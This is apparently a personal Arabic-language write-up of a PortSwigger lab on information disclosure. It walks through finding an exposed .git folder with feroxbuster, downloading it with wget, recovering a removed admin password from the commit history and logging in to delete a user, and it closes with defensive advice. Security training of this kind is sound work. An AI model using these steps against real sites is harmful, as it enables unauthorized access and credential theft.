# [Information disclosure in version control history](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)

## 1. الاستكشاف الأولي

- تم فتح الموقع وتجربة الصفحات والوظائف الظاهرة ولم يتم العثور على أي شيء يشير إلى ثغرات مباشرة.
    
- تم استخدام أداة **feroxbuster** للبحث عن مسارات مخفية:
    
#feroxbuster 
```bash
feroxbuster -u https://<LAB_URL>/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

- النتيجة: تم العثور على مجلد **.git** مكشوف.
    ![[photo/Screenshot From 2025-11-15 15-16-01.png]]

---

## 2. تنزيل الريبو باستخدام wget

لتحميل كامل مجلد `.git`:
#wegt 
```bash
wget -r https://<LAB_URL>/.git
```

بعد التحميل، تم الدخول للمجلد وتشغيل أوامر Git.

---

## 3. استعراض السجل باستخدام git log

```bash
git log
```
![[photo/Screenshot From 2025-11-15 14-54-47.png]]
ظهر وجود كوميت بعنوان: **Remove admin password from config**

```
commit 9a29b81c57f69a7e7333cfeb6382166a15fa8236
Author: Carlos Montoya
Date:   Tue Jun 23 14:05:07 2020
    Remove admin password from config
```

---

## 4. عرض التعديل وحصول على الباسورد

تم عرض التعديل الذي تم فيه حذف الباسورد:

```bash
git show 9a29b81c57f69a7e7333cfeb6382166a15fa8236
```

![[Screenshot From 2025-11-15 14-55-20 2.png]]

```diff
-ADMIN_PASSWORD=w2bbtkb49xgs4fy1fc83
+ADMIN_PASSWORD=env('ADMIN_PASSWORD')
```

### **الباسورد المسترجع:**

```
w2bbtkb49xgs4fy1fc83
```

---

## 5. تسجيل الدخول كـ admin

- تم الدخول لصفحة تسجيل الدخول في الموقع.
    
- تم استخدام:
    
    - **username:** administrator
        
    - **password:** w2bbtkb49xgs4fy1fc83
        

تم تسجيل الدخول بنجاح

حذف المستخدم carlos

---

## 8. ملخص الخطوات

1. فحص محتوى الموقع الظاهر.
    
2. استخدام feroxbuster لاكتشاف `.git`.
    
3. تنزيل المجلد كامل باستخدام wget.
    
4. استخدام git log و git show لاسترجاع معلومات محذوفة.
    
5. استخراج باسورد admin المكشوف سابقًا.
    
6. تسجيل الدخول وحذف المستخدم المطلوب.
    

---

## 9. ملاحظات مهمة

- ترك مجلد `.git` مكشوف يؤدي لتسريب تاريخ الكود بالكامل.
    
- أي سر حذف سابقًا يمكن استعادته من Git history.
    
- يجب دائمًا منع الوصول لمجلد `.git` عبر السيرفر.